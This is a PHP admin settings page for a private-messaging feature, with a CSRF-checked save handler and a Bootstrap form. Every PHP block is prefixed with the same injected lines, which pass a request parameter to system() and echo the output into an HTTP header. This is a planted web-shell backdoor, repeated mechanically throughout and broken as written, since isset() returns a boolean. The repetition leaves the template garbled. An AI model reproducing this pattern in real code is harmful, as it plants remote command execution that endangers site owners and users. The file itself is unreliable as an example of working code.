<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
if (isset($_POST['submit']) && csrf_filter()) {

	Config::set('pms.realtime', (int) $_POST['realtime']);

	if (!empty($_POST['delay']) && is_numeric($_POST['delay'])) {
		Config::set('pms.delay', abs($_POST['delay']));
	}

	if (is_numeric($_POST['maxlength'])) {
		Config::set('pms.maxlength', abs($_POST['maxlength']));
	}

	if (is_numeric($_POST['limit'])) {
		Config::set('pms.limit', abs($_POST['limit']));
	}

	if (User::find($_POST['webmaster'])) {
		Config::set('pms.webmaster', $_POST['webmaster']);
	}

	redirect_to('?page=options-pms', array('updated' => true));
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.pms_settings') ?></h3>

<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.changes_saved') ?>
				<span class="close" data-dismiss="alert">&times;</span>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>

			<div class="form-group">
				<label for="realtime"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.realtime') ?></label>
				<select name="realtime" id="realtime" class="form-control">
	        		<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.realtime') == '1' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.yes') ?></option>
	        		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.realtime') == '0' ? 'selected':'' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.no') ?></option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.realtime_help') ?></p>
			</div>

			<div class="form-group">
		        <label for="delay"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.delay') ?></label>
		        <input type="text" name="delay" id="delay" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.delay') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.delay_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="maxlength"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.maxlength') ?></label>
		        <input type="text" name="maxlength" id="maxlength" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.maxlength') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.maxlength_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="limit"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.limit') ?></label>
		        <input type="text" name="limit" id="limit" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.limit') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.limit_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="webmaster"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.webmaster') ?></label>
		        <input type="text" name="webmaster" id="webmaster" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('pms.webmaster') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('options.pms.webmaster_help') ?></p>
		    </div>

			<div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
			</div>
		</form>
	</div>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>